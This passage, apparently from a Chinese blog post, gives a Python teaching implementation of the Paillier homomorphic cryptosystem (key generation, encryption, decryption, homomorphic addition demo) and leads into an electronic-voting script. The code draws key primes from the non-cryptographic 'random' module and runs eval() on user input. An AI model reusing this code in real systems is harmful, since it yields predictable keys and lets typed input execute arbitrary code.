class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; random&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; math&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;keygen&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;input_bits&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;is_prime&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;n, k=&lt;span class=&#34;number&#34;&gt;14&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;#The accuracy of the Miller-Rabin test after k iterations is 1 - (1/2^k). Empirical testing has shown that when k is set to 14, the accuracy of the test reaches 99.99%.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; n &amp;lt;= &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; n &amp;lt;= &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; n % &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        r = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        d = n - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; d % &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            r += &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            d //= &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(k):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            a = random.randint(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, n - &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            x = &lt;span class=&#34;built_in&#34;&gt;pow&lt;/span&gt;(a, d, n)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; x == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; x == n - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(r - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                x = &lt;span class=&#34;built_in&#34;&gt;pow&lt;/span&gt;(x, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, n)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; x == n - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;generate_prime&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;bits&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            p = random.getrandbits(bits)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;# 确认p是素数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            p |= &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; is_prime(p):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;create_pq&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;bits&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            p = generate_prime(bits)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            q = generate_prime(bits)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; p != q:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;# 计算 gcd(p*q, (p-1)*(q-1))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; math.gcd(p * q, (p - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) * (q - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)) == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; p, q&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;calculate_miu&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;p, q, N, lambda_1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# mo zhi shu yun suan&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;mod_exp&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;base, exponent, modulus&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            result = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            base = base % modulus&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; exponent &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; exponent % &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    result = (result * base) % modulus&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                exponent = exponent &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                base = (base * base) % modulus&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; result&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# mo ni yun suan&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;mod_inv&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;a, m&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            m0, x0, x1 = m, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; a &amp;gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                q = a // m&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                m, a = a % m, m&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                x0, x1 = x1 - q * x0, x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; x1 + m0 &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; x1 &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; x1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# calculate miu&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        g = random.randint(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, N - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        miu = mod_inv(((mod_exp(g, lambda_1, N ** &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) // N), N)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; miu,g&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p, q = create_pq(input_bits)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    N=p*q&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    lambda_1=&lt;span class=&#34;built_in&#34;&gt;abs&lt;/span&gt;((p-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)*(q-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))//math.gcd((p-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;),(q-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    miu,g = calculate_miu(p, q, N, lambda_1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; N, g ,lambda_1,miu&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;encrypt&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;m,N,g&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r = random.randint(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, N**&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; math.gcd(r, N**&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        r = random.randint(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, N**&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    c = (&lt;span class=&#34;built_in&#34;&gt;pow&lt;/span&gt;(g, m, N**&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) * &lt;span class=&#34;built_in&#34;&gt;pow&lt;/span&gt;(r, N, N**&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)) % (N**&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#加密密文&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;decrypt&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;c,lambda_1,N,miu&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    decrypted_m = ((&lt;span class=&#34;built_in&#34;&gt;pow&lt;/span&gt;(c, lambda_1, N**&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) * miu // N) % N&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; decrypted_m&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    N,g,lambda_1,miu=keygen(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    m1=&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;请输入第一个明文&amp;quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    m2=&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;请输入第二个明文&amp;quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    c1=encrypt(m1,N,g)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    c2=encrypt(m2,N,g)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;对第一个明文加密后得到密文:&amp;#123;&amp;#125;&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(c1))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;对第二个明文加密后得到密文:&amp;#123;&amp;#125;&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(c2))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    c=c1*c2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;两密文相乘得到:&amp;#123;&amp;#125;&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(c))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    m=decrypt(c,lambda_1,N,miu)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;两密文相乘后解密得到的明文为:&amp;#123;&amp;#125;&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(m))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;string&#34;&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    main()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;首先我们编写 keygen 函数，用于生成密钥。我采用 Miller-Rabin 素性检测来检验，根据计算得知，运行 k 次后判断一个数是素数的正确率大于 (1-1/2^k), 经验证，当 k=14 时，判断的准确率大于 99.99%。根据公式来计算 p，q，λ，μ 和 N。然后根据公司和得到的私钥、公钥、明文来进行 encrypt 和 decrypt 函数的编写。然后编写 main 函数测试输入明文 333 和 444 后程序的输出结果。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1FbGVjdHJvbmljVm90aW5nLWh2MnprNjZhb3dsenQ0ZWZxdmQxMTNjLnB5&#34;&gt;然后我们编写 ElectronicVoting.py&lt;/span&gt;&lt;/p&gt;
